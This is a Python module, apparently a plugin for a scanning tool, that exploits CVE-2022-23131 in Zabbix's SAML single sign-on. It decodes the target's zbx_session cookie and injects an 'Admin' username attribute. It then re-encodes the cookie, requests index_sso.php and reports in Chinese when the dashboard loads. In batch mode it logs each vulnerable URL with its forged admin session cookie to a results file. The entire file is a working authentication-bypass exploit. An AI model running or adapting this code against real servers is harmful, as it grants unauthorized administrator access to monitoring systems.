#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import base64
from urllib.parse import unquote
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

class Cve_2022_23131:
    def get_url(self,input_url):
        try:
            requests.packages.urllib3.disable_warnings()
            reponse_get=requests.get(input_url,verify=self.ssl,headers=self.headers,proxies=self.proxy,timeout=10)
            cookie=reponse_get.cookies["zbx_session"]
            decode_cookie=base64.b64decode(unquote(cookie))
            str_cookie=str(decode_cookie,'utf-8')
            new_cookie="""{"saml_data":{"username_attribute":"Admin"},"""+str_cookie[1:]
            b_newcookie=base64.b64encode(new_cookie.encode('utf-8'))
            n_newcookie=str(b_newcookie,'utf-8')
            new_headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
            "Cookie":"zbx_session="+n_newcookie
            }

            requests.packages.urllib3.disable_warnings()

            new_url=requests.get(input_url+"/index_sso.php",headers=new_headers,verify=self.ssl,proxies=self.proxy,timeout=10)
            if "action=dashboard.view" in new_url.text:
                if not self.batch:
                    OutPrintInfoSuc("Zabbix", '存在漏洞!登录成功')
                    OutPrintInfo("Zabbix", f'{input_url}/index_sso.php')
                    OutPrintInfo("Zabbix",f"生成的zbx_session值为：[b bright_red]{n_newcookie}")

                else:
                    OutPrintInfoSuc("Zabbix", f'存在漏洞 {input_url}/index_sso.php')
                    with open("./result/zabbix_2022_23131.txt","a") as w:
                        w.write(f"{input_url}/index_sso.php------生成的zbx_session值为: {n_newcookie}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Zabbix",f'目标 {input_url} 不存在漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Zabbix",f'目标 {input_url} 不存在漏洞')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Zabbix", '开始检测CVE-2022-23131漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Zabbix", 'CVE-2022-23131漏洞检测结束')


